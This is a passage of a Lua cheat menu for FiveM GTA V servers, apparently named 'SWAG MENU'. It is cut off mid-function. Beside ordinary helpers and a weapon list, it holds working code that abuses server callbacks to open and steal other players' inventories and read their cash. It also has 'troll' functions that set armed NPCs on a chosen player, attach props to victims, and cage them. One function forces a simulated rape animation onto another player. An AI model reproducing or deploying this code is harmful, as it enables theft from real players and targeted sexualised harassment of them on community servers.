
--SnowFlake#4269 made this --



-- SendServerEvent('NCPP:RequestAuth', false)

local CreateThread = Citizen.CreateThread
local CreateThreadNow = Citizen.CreateThreadNow

-- Swag Functions
---------------------------------------------------------------------------------------
local Swag = {}

function Swag:CheckName(str) 
	if string.len(str) > 16 then
		fmt = string.sub(str, 1, 16)
		return tostring(fmt .. "...")
	else
		return str
	end
end
--SnowFlake#4269 made this --

local function wait(self)
	local rets = Citizen.Await(self.p)
	if not rets then
		if self.r then
			rets = self.r
		else
			error("^1SWAG ERROR : async->wait() = nil | contact nobody")
		end
	end

	return table.unpack(rets, 1, table.maxn(rets))
end
--SnowFlake#4269 made this --

local function areturn(self, ...)
	self.r = {...}
	self.p:resolve(self.r)
end
  --SnowFlake#4269 made this --
-- create an async returner or a thread (Citizen.CreateThreadNow)
-- func: if passed, will create a thread, otherwise will return an async returner
function Swag.Async(func)
	if func then
		Citizen.CreateThreadNow(func)
	else
		return setmetatable({ wait = wait, p = promise.new() }, { __call = areturn })
	end
end
--SnowFlake#4269 made this --
Swag.Math = {}
--SnowFlake#4269 made this --
Swag.Math.Round = function(value, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", value))
end
--SnowFlake#4269 made this --
Swag.Math.GroupDigits = function(value)
	local left,num,right = string.match(value,'^([^%d]*%d)(%d*)(.-)$')

	return left..(num:reverse():gsub('(%d%d%d)','%1' .. _U('locale_digit_grouping_symbol')):reverse())..right
end
--SnowFlake#4269 made this --
Swag.Math.Trim = function(value)
	if value then
		return (string.gsub(value, "^%s*(.-)%s*$", "%1"))
	else
		return nil
	end
end
--SnowFlake#4269 made this --
-- Swag.Player Table
Swag.Player = {
	Spectating = false,
	IsInVehicle = false,
	isNoclipping = false,
	Vehicle = 0,
}
--SnowFlake#4269 made this --
-- Menu toggle table
Swag.Toggle = {
	RainbowVehicle = false,
	Forklift = false,
	ReplaceVehicle = true,
	SpawnInVehicle = true,
	VehicleCollision = false,
	MagnetoMode = false,
	SelfRagdoll = false,
	EasyHandling = false,
	Waterp = false,
	DeleteGun = false,
	RapidFire = false,
	VehicleNoFall = false,
}
--SnowFlake#4269 made this --
Swag.Events = {
	Revive = {}
}
--SnowFlake#4269 made this --
Swag.Game = {}
--SnowFlake#4269 made this --
function Swag.Game:GetPlayers()
	local players = {}
	
	for _,player in ipairs(GetActivePlayers()) do
		local ped = GetPlayerPed(player)
		
		if DoesEntityExist(ped) then
			table.insert(players, player)
		end
	end
	
	return players
end
--SnowFlake#4269 made this --

function Swag.Game:GetPlayersInArea(coords, area)
	local players  = Swag.Game:GetPlayers()
	local playersInArea = {}

	for i=1, #players, 1 do
		local target       = GetPlayerPed(players[i])
		local targetCoords = GetEntityCoords(target)
		local distance     = GetDistanceBetweenCoords(targetCoords, coords.x, coords.y, coords.z, true)

		if distance <= area then
			table.insert(playersInArea, players[i])
		end
	end

	return playersInArea
end
--SnowFlake#4269 made this --
function Swag.Game:GetPedStatus(playerPed) 

	local inVehicle = IsPedInAnyVehicle(playerPed, false)
	local isIdle = IsPedStill(playerPed)
	local isWalking = IsPedWalking(playerPed)
	local isRunning = IsPedRunning(playerPed)

	if inVehicle then
		return "~o~In Vehicle"

	elseif isIdle then
		return "~o~Idle"

	elseif isWalking then
		return "~o~Walking"

	elseif isRunning then
		return "~o~Jogging"
	
	else
		return "~o~Running"
	end

end
--SnowFlake#4269 made this --
function Swag.Game:GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end
--SnowFlake#4269 made this --
function Swag.Game:GetSeatPedIsIn(ped)
	if not IsPedInAnyVehicle(ped, false) then return
	else
		veh = GetVehiclePedIsIn(ped)
		for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
			if GetPedInVehicleSeat(veh) then return i end
		end
	end
end
--SnowFlake#4269 made this --
local StealDisc_Data = {type = "player", owner = " ", seize = true}
--SnowFlake#4269 made this --
SearchDisc = function(target)
    if ESX ~= nil then
        ESX.TriggerServerCallback(
            "disc-inventoryhud:getIdentifier",
            function(value)
                StealDisc_Data.owner = value
                TriggerCustomEvent(false, "disc-inventoryhud:openInventory", StealDisc_Data)
            end,
            target
        )

    end
end
--SnowFlake#4269 made this --

local _getIdentifier_inventory={type="player",owner=" ",steal=true }
StealDisc = function(target)
    if ESX ~= nil then
        ESX.TriggerServerCallback(
            "disc-inventoryhud:getIdentifier",
            function(v)
                _getIdentifier_inventory.owner = v
                TriggerCustomEvent(false, "disc-inventoryhud:openInventory", _getIdentifier_inventory)
            end,
            target
        )
    end
end
--SnowFlake#4269 made this --

function Swag.Game:RequestControlOnce(entity)
    if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end
--SnowFlake#4269 made this --
function Swag.Game:TeleportToPlayer(target)
	local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end
--SnowFlake#4269 made this --
function Swag.Game.GetVehicleProperties(vehicle)
	if DoesEntityExist(vehicle) then
		local colorPrimary, colorSecondary = GetVehicleColours(vehicle)
		local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
		local extras = {}

		for id=0, 12 do
			if DoesExtraExist(vehicle, id) then
				local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
				extras[tostring(id)] = state
			end
		end

		return {
			model             = GetEntityModel(vehicle),

			plate             = Swag.Math.Trim(GetVehicleNumberPlateText(vehicle)),
			plateIndex        = GetVehicleNumberPlateTextIndex(vehicle),

			bodyHealth        = Swag.Math.Round(GetVehicleBodyHealth(vehicle), 1),
			engineHealth      = Swag.Math.Round(GetVehicleEngineHealth(vehicle), 1),

			fuelLevel         = Swag.Math.Round(GetVehicleFuelLevel(vehicle), 1),
			dirtLevel         = Swag.Math.Round(GetVehicleDirtLevel(vehicle), 1),
			color1            = colorPrimary,
			color2            = colorSecondary,

			pearlescentColor  = pearlescentColor,
			wheelColor        = wheelColor,

			wheels            = GetVehicleWheelType(vehicle),
			windowTint        = GetVehicleWindowTint(vehicle),

			neonEnabled       = {
				IsVehicleNeonLightEnabled(vehicle, 0),
				IsVehicleNeonLightEnabled(vehicle, 1),
				IsVehicleNeonLightEnabled(vehicle, 2),
				IsVehicleNeonLightEnabled(vehicle, 3)
			},

			neonColor         = table.pack(GetVehicleNeonLightsColour(vehicle)),
			extras            = extras,
			tyreSmokeColor    = table.pack(GetVehicleTyreSmokeColor(vehicle)),

			modSpoilers       = GetVehicleMod(vehicle, 0),
			modFrontBumper    = GetVehicleMod(vehicle, 1),
			modRearBumper     = GetVehicleMod(vehicle, 2),
			modSideSkirt      = GetVehicleMod(vehicle, 3),
			modExhaust        = GetVehicleMod(vehicle, 4),
			modFrame          = GetVehicleMod(vehicle, 5),
			modGrille         = GetVehicleMod(vehicle, 6),
			modHood           = GetVehicleMod(vehicle, 7),
			modFender         = GetVehicleMod(vehicle, 8),
			modRightFender    = GetVehicleMod(vehicle, 9),
			modRoof           = GetVehicleMod(vehicle, 10),

			modEngine         = GetVehicleMod(vehicle, 11),
			modBrakes         = GetVehicleMod(vehicle, 12),
			modTransmission   = GetVehicleMod(vehicle, 13),
			modHorns          = GetVehicleMod(vehicle, 14),
			modSuspension     = GetVehicleMod(vehicle, 15),
			modArmor          = GetVehicleMod(vehicle, 16),

			modTurbo          = IsToggleModOn(vehicle, 18),
			modSmokeEnabled   = IsToggleModOn(vehicle, 20),
			modXenon          = IsToggleModOn(vehicle, 22),

			modFrontWheels    = GetVehicleMod(vehicle, 23),
			modBackWheels     = GetVehicleMod(vehicle, 24),

			modPlateHolder    = GetVehicleMod(vehicle, 25),
			modVanityPlate    = GetVehicleMod(vehicle, 26),
			modTrimA          = GetVehicleMod(vehicle, 27),
			modOrnaments      = GetVehicleMod(vehicle, 28),
			modDashboard      = GetVehicleMod(vehicle, 29),
			modDial           = GetVehicleMod(vehicle, 30),
			modDoorSpeaker    = GetVehicleMod(vehicle, 31),
			modSeats          = GetVehicleMod(vehicle, 32),
			modSteeringWheel  = GetVehicleMod(vehicle, 33),
			modShifterLeavers = GetVehicleMod(vehicle, 34),
			modAPlate         = GetVehicleMod(vehicle, 35),
			modSpeakers       = GetVehicleMod(vehicle, 36),
			modTrunk          = GetVehicleMod(vehicle, 37),
			modHydrolic       = GetVehicleMod(vehicle, 38),
			modEngineBlock    = GetVehicleMod(vehicle, 39),
			modAirFilter      = GetVehicleMod(vehicle, 40),
			modStruts         = GetVehicleMod(vehicle, 41),
			modArchCover      = GetVehicleMod(vehicle, 42),
			modAerials        = GetVehicleMod(vehicle, 43),
			modTrimB          = GetVehicleMod(vehicle, 44),
			modTank           = GetVehicleMod(vehicle, 45),
			modWindows        = GetVehicleMod(vehicle, 46),
			modLivery         = GetVehicleLivery(vehicle)
		}
	else
		return
	end
end
--SnowFlake#4269 made this --
Swag.Keys = {
	["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24
}
--SnowFlake#4269 made this --
---------------------------------------------------------------------------------------
--SnowFlake#4269 made this --
local storedPrimary, storedSecondary = nil
--SnowFlake#4269 made this --
local function RainbowVehicle(justToggled)
	if Swag.Player.IsInVehicle then
		if justToggled then
			storedPrimary, storedSecondary = GetVehicleColours(Swag.Player.Vehicle)
			Swag.Toggle.RainbowVehicle = justToggled
		else
			Swag.Toggle.RainbowVehicle = justToggled
			ClearVehicleCustomPrimaryColour(Swag.Player.Vehicle)
			ClearVehicleCustomSecondaryColour(Swag.Player.Vehicle)
			SetVehicleColours(Swag.Player.Vehicle, storedPrimary, storedSecondary)
		end
	else
		Swag.Toggle.RainbowVehicle = justToggled
	end
end

local NoclipSpeed = 1
local oldSpeed = 1

local isMenuEnabled = true

-- Globals
-- Menu color customization
local _menuColor = {
	base = { r = 155, g = 89, b = 182, a = 255 },
	highlight = { r = 155, g = 89, b = 182, a = 150 },
	shadow = { r = 96, g = 52, b = 116, a = 150 },
}

local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = nil
		enum.handle = nil
	end
}

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  	local iter, id = initFunc()
	  	if not id or id == 0 then
			disposeFunc(iter)
			return
	  	end

	  	local enum = {handle = iter, destructor = disposeFunc}
	  	setmetatable(enum, entityEnumerator)

	  	local next = true
	  	repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
	  	until not next

	  	enum.destructor, enum.handle = nil, nil
	  	disposeFunc(iter)
	end)
end

local function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

local function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

local function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

local function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

local function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

local function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

local function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

local function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

local function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

local function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    local screenCoordsx = (x - 0.5) * 2.0
    local screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

local function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

local function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end

AddTextEntry('notification_buffer', '~a~')
AddTextEntry('text_buffer', '~a~')
AddTextEntry('preview_text_buffer', '~a~')
RegisterTextLabelToSave('keyboard_title_buffer')

-- Classes
-- > Gatekeeper
Gatekeeper = {}

-- Fullscreen Notification builder
local _notifTitle = "~p~SWAG MENU"
local _notifMsg = "We must authenticate your license before you proceed"
local _notifMsg2 = "~g~Please enter your unique key code"
local _errorCode = 0

local _blackAmount = 0 
-- Get other player data
local function GetPlayerMoney(player)
	ESX.TriggerServerCallback('esx_policejob:getOtherPlayerData', function(data)
		for k,v in ipairs(data.inventory) do
			if v.name == 'cash' then
				_blackAmount =  v.count
				break
			end
		end
	end, player)

	return _blackAmount
end

local ratio = GetAspectRatio(true)
local mult = 10^3
local floor = math.floor
local unpack = table.unpack

local streamedTxtSize

local txtRatio = {}

local function DrawSpriteScaled(textureDict, textureName, screenX, screenY, width, height, heading, red, green, blue, alpha)
	-- calculate the height of a sprite using aspect ratio and hash it in memory
	local index = tostring(textureName)
	
	if not txtRatio[index] then
		txtRatio[index] = {}
		local res = GetTextureResolution(textureDict, textureName)
		
		txtRatio[index].ratio = (res[2] / res[1])
		txtRatio[index].height = floor(((width * txtRatio[index].ratio) * ratio) * mult + 0.5) / mult
		DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
	end
	
	DrawSprite(textureDict, textureName, screenX, screenY, width, txtRatio[index].height, heading, red, green, blue, alpha)
end

local function RequestControlOnce(entity)
    if NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

-- This is for MK2 Weapons
local weaponMkSelection = {}

local weaponTextures = {
	{'https://i.imgur.com/GmpQc7C.png', 'weapon_dagger'},
	{'https://i.imgur.com/dL5qnPn.png?1', 'weapon_bat'},
	{'https://i.imgur.com/tl77ZyC.png', 'weapon_knife'},
	{'https://i.imgur.com/RaFQ0th.png', 'weapon_machete'},
}

local w_Txd = CreateRuntimeTxd('weapon_icons')

local function CreateWeaponTextures()
	
	for i = 1, #weaponTextures do
		local w_DuiObj = CreateDui(weaponTextures[i][1], 256, 128)
		local w_DuiHandle = GetDuiHandle(w_DuiObj)
		local w_Txt = CreateRuntimeTextureFromDuiHandle(w_Txd, weaponTextures[i][2], w_DuiHandle)
		
		-- print(("Successfully created texture %s"):format(weaponTextures[i][2]))
		--CommitRuntimeTexture(w_Txt)
	end
end

-- CreateWeaponTextures()

-- [NOTE] Weapon Table

local t_Weapons = {

	-- Melee Weapons
	{`WEAPON_BAT`, "Baseball Bat", "weapon_bat", "weapon_icons", "melee"},
	{`WEAPON_BATTLEAXE`, "Battleaxe", "w_me_fireaxe", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_BOTTLE`, "Broken Bottle", nil, nil, "melee"},
	{`WEAPON_CROWBAR`, "Crowbar", "w_me_crowbar", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_DAGGER`, "Antique Cavalry Dagger", "weapon_dagger", "weapon_icons", "melee"},
	{`WEAPON_FLASHLIGHT`, "Flashlight", nil, nil, "melee"},
	{`WEAPON_GOLFCLUB`, "Golf Club", "w_me_gclub", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_HAMMER`, "Hammer", "w_me_hammer", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_HATCHET`, "Hatchet", nil, nil, "melee"},
	{`WEAPON_KNIFE`, "Knife", "weapon_knife", "weapon_icons", "melee"},
	{`WEAPON_KNUCKLE`, "Brass Knuckles", nil, nil, "melee"},
	{`WEAPON_MACHETE`, "Machete", 'weapon_machete', 'weapon_icons', "melee"},
	{`WEAPON_NIGHTSTICK`, "Nightstick", "w_me_nightstick", "mpweaponsunusedfornow", "melee"},
	{`WEAPON_POOLCUE`, "Pool Cue", nil, nil, "melee"},
	{`WEAPON_STONE_HATCHET`, "Stone Hatchet", nil, nil, "melee"},
	{`WEAPON_SWITCHBLADE`, "Switchblade", nil, nil, "melee"},
	{`WEAPON_WRENCH`, "Wrench", "w_me_wrench", "mpweaponsunusedfornow", "melee"},
	
	-- Handguns
	{'WEAPON_PISTOL', "Pistol", "w_pi_pistol", "mpweaponsgang1_small", "handguns", true},
	{`WEAPON_COMBATPISTOL`, "Combat Pistol", "w_pi_combatpistol", "mpweaponscommon_small", "handguns"},
	{`WEAPON_APPISTOL`, "AP Pistol", "w_pi_apppistol", "mpweaponsgang1_small", "handguns"},
	{`WEAPON_STUNGUN`, "Stungun", "w_pi_stungun", "mpweaponsgang0_small", "handguns"},
	{`WEAPON_PISTOL50`, "Pistol .50", nil, nil, "handguns"},
	{'WEAPON_SNSPISTOL', "SNS Pistol", nil, nil, "handguns", true},
	{`WEAPON_HEAVYPISTOL`, "Heavy Pistol", nil, nil, "handguns"},
	{`WEAPON_VINTAGEPISTOL`, "Vintage Pistol", nil, nil, "handguns"},
	{`WEAPON_FLAREGUN`, "Flare Gun", nil, nil, "handguns"},
	{`WEAPON_MARKSMANPISTOL`, "Marksman Pistol", nil, nil, "handguns"},
	{'WEAPON_REVOLVER', "Heavy Revolver", nil, nil, "handguns", true},
	{`WEAPON_DOUBLEACTION`, "Double Action Revolver", nil, nil, "handguns"},
	{`WEAPON_RAYPISTOL`, "Up-n-Atomizer", nil, nil, "handguns"},
	{`WEAPON_CERAMICPISTOL`, "Ceramic Pistol", nil, nil, "handguns"},
	{`WEAPON_NAVYREVOLVER`, "Navy Revolver", nil, nil, "handguns"},

	-- SMGs
	{`WEAPON_MICROSMG`, "Micro SMG", "w_sb_microsmg", "mpweaponscommon_small", "smgs"},
	{'WEAPON_SMG', "SMG", nil, nil, "smgs", true},
	{`WEAPON_ASSAULTSMG`,"Assault SMG", "w_sb_assaultsmg", "mpweaponscommon_small", "smgs"},
	{`WEAPON_COMBATPDW`, "Combat PDW", nil, nil, "smgs"},
	{`weapon_machinepistol`, "Machine Pistol", nil, nil, "smgs"},
	{`weapon_minismg`, "Mini SMG", nil, nil, "smgs"},
	{`weapon_raycarbine`, "Unholy Hellbringer", nil, nil, "smgs"},
	
	-- Shotguns
	{'WEAPON_PUMPSHOTGUN', "Pump Shotgun", "w_sg_pumpshotgun", "mpweaponscommon_small", "shotguns", true},
	{`WEAPON_SAWNOFFSHOTGUN`, "Sawed-Off Shotgun", "w_sg_sawnoff", "mpweaponsgang1", "shotguns"},
	{`WEAPON_ASSAULTSHOTGUN`, "Assault Shotgun", "w_sg_assaultshotgun", "mpweaponscommon_small", "shotguns"},
	{`weapon_bullpupshotgun`, "Bullpup Shotgun", nil, nil, "shotguns"},
	{`weapon_musket`, "Musket", nil, nil, "shotguns"},
	{`weapon_heavyshotgun`, "Heavy Shotgun", nil, nil, "shotguns"},
	{`weapon_dbshotgun`, "Double Barrel Shotgun", nil, nil, "shotguns"},
	{`weapon_autoshotgun`, "Sweeper Shotgun", nil, nil, "shotguns"},

	-- Assault Rifles
	{'WEAPON_ASSAULTRIFLE', "Assault Rifle", "w_ar_assaultrifle", "mpweaponsgang1_small", "assaultrifles", true},
	{'weapon_carbinerifle', "Carbine Rifle", "w_ar_carbinerifle", "mpweaponsgang0_small", "assaultrifles", true},
	{'weapon_advancedrifle', "Advanced Rifle", nil, nil, "assaultrifles"},
	{'weapon_specialcarbine', "Special Carbine", nil, nil, "assaultrifles", true},
	{'weapon_bullpuprifle', "Bullpup Rifle", nil, nil, "assaultrifles", true},
	{'weapon_compactrifle', "Compact Rifle", nil, nil, "assaultrifles"},

	-- LMGs
	{'weapon_mg', "MG", nil, nil, "lmgs"},
	{'weapon_combatmg', "Combat MG", "w_mg_combatmg", "mpweaponsgang0_small", "lmgs", true},
	{'weapon_gusenburg', "Gusenberg Sweeper", nil, nil, "lmgs"},

	-- Sniper Rifles
	{`WEAPON_SNIPERRIFLE`, "Sniper Rifle", "w_sr_sniperrifle", "mpweaponsgang0_small", "sniperrifles"},
	{'WEAPON_HEAVYSNIPER', "Heavy Sniper", "w_sr_heavysniper", "mpweaponsgang0_small", "sniperrifles", true},
	{'weapon_marksmanrifle', "Marksman Rifle", nil, nil, "sniperrifles", true},
	-- Heavy Weapons
	{`WEAPON_RPG`, "RPG", nil, nil, "heavyweapons"},
	{`WEAPON_GRENADELAUNCHER`, "Grenade Launcher", nil, nil, "heavyweapons"},
	{'weapon_grenadelauncher_smoke', "Grenade Launcher (Smoke)", nil, nil, "heavyweapons"},
	{'weapon_minigun', "Minigun", nil, nil, "heavyweapons"},
	{'weapon_firework', "Firework Launcher", nil, nil, "heavyweapons"},
	{'weapon_railgun', "Railgun", nil, nil, "heavyweapons"},
	{'weapon_hominglauncher', "Homing Launcher", nil, nil, "heavyweapons"},
	{'weapon_compactlauncher', "Compact Grenade Launcher", nil, nil, "heavyweapons"},
	{'weapon_rayminigun', "Widowmaker", nil, nil, "heavyweapons"},
	
	--Thrown
    {"WEAPON_GRENADE", "Grenade", nil, nil, nil},
    {"WEAPON_STICKYBOMB", "Sticky Bomb", nil, nil, nil},
    {"WEAPON_PROXMINE", "Proximine", nil, nil, nil},
    {"WEAPON_BZGAS", "Gas Grenade", nil, nil, nil},
    {"WEAPON_SMOKEGRENADE", "Smoke Grenade", nil, nil, nil},
    {"WEAPON_MOLOTOV", "Molotov", nil, nil, nil},
    {"WEAPON_FIREEXTINGUISHER", "Extinguisher", nil, nil, nil},
    {"WEAPON_PETROLCAN", "Gas Can", nil, nil, nil},
    {"WEAPON_SNOWBALL", "SnowBall", nil, nil, nil},
    {"WEAPON_FLARE", "Flare", nil, nil, nil},
    {"WEAPON_BALL", "Ball", nil, nil, nil},
}

RequestWeaponAsset(`WEAPON_STUNGUN`)

--Player Troll

function nearby_peds_attack(target)
    local coords = GetEntityCoords(GetPlayerPed(target))
    
    for k in EnumeratePeds() do
        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
            local rand = math.ceil(math.random(#t_Weapons))
            GiveWeaponToPed(k, GetHashKey(t_Weapons[rand][1]), 9999, 0, 1)
            ClearPedTasks(k)
            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
            SetPedCombatAbility(k, 100)
            SetPedCombatRange(k, 2)
            SetPedCombatAttributes(k, 46, 1)
            SetPedCombatAttributes(k, 5, 1)
        end
    end
end

function RequestModelSync(mod)
	local model = GetHashKey(mod)
	RequestModel(model)
	while not HasModelLoaded(model) do
		RequestModel(model)
		Citizen.Wait(0)
	end
end
function RapeP(SelectedPlayer)
	RequestModelSync("a_m_o_acult_01")
	RequestAnimDict("rcmpaparazzo_2")
	while not HasAnimDictLoaded("rcmpaparazzo_2") do
		Citizen.Wait(0)
	end
	if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
		local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
		while not NetworkHasControlOfEntity(veh) do
			NetworkRequestControlOfEntity(veh)
			Citizen.Wait(0)
		end
		SetEntityAsMissionEntity(veh, true, true)
		DeleteVehicle(veh)
		DeleteEntity(veh)
	end
	count = -0.2
	for b=1,3 do
		local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
		local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
		SetEntityAsMissionEntity(rapist, true, true)
		AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
		ClearPedTasks(GetPlayerPed(SelectedPlayer))
		TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
		SetPedKeepTask(rapist)
		TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
		SetEntityInvincible(rapist, true)
		count = count - 0.4
	end           
end

function FuckUpP(SelectedPlayer)
	Citizen.CreateThread(function()
		local pisello = CreateObject("prop_tanktrailer_01a", 0, 0, 0, true, true, true)
		local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
		local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
		AttachEntityToEntity(pisello, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
		AttachEntityToEntity(pisello2, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
		AttachEntityToEntity(pisello3, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
	end)
end

function SCage(SelectedPlayer)
	local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
	ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
	local SmallCage =
	CreateObject(GetHashKey("hei_prop_heist_apecrate"), x, y, z-1, true, true, false)
	SetEntityHeading(SmallCage, 0)
	FreezeEntityPosition(SmallCage, true)
end

function RealCage(SelectedPlayer)
	local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
	
	local cagemodel = "prop_rub_cage01a"
	local cagehash = GetHashKey(cagemodel)
	ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
	RequestModel(cagehash)
	while not HasModelLoaded(cagehash) do
	  Citizen.Wait(0)
	end
